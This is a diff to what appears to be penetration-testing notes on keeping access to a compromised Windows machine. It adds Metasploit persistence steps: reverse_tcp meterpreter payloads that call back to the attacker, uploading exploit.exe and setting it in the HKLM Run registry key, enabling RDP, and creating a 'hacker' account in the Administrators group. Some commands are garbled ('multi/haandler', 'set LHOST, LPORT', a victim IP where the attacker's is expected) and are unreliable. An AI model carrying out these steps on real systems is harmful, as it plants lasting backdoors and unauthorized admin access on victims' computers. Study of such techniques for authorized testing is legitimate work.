@@ -62,7 +62,7 @@ msf > use exploit/windows/local/persistence
 msf >  set SESSION
 msf > set STARTUP SYSTEM # since we have system privs.
 msf > set payload windows/meterpreter/reverse_tcp
-msf > set LHOST, LPORT 80 
+msf > set LHOST, LPORT 5555
 msf > run 
 # anytime we want to connect back to this machine, we just set up a listener with same parameters passed (use multi/handler).
 # Note this persistence will continue even after the victim pc is rebooted.
@@ -78,6 +78,14 @@ msfvenom -p windows/meterpreter/reverse_tcp -f vbs ......................
 meterpreter > upload exploit.exe C:\Windows
 # edit the registry keys
 meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -d "C:\Windows\exploit.exe" -v exploit.exe
+
+
+# establishing persistence with metasploit
+meterpreter > run persistence -h # help menu.
+meterpreter > run persistence -A -X -i 5 -p 8000 -r <victimIP>
+
+# configure a handler.
+use multi/haandler
 ```
 {% endcode %}
 
@@ -86,6 +94,10 @@ meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\
 Another way to establish persistence is to create a new user and add to the administrator group.
 
 ```
+# enable RDP (3389) service
+meterpreter > run getgui -h # view the help menu.
+rdesktop <ip_addr> -u <username> -p <pwd> # connect to rdp.
+
 cmd> net user hacker /add # add new user hacker.
 cmd> net localgroup "Administrators" hacker /add # add new user to local admin group.
 ```
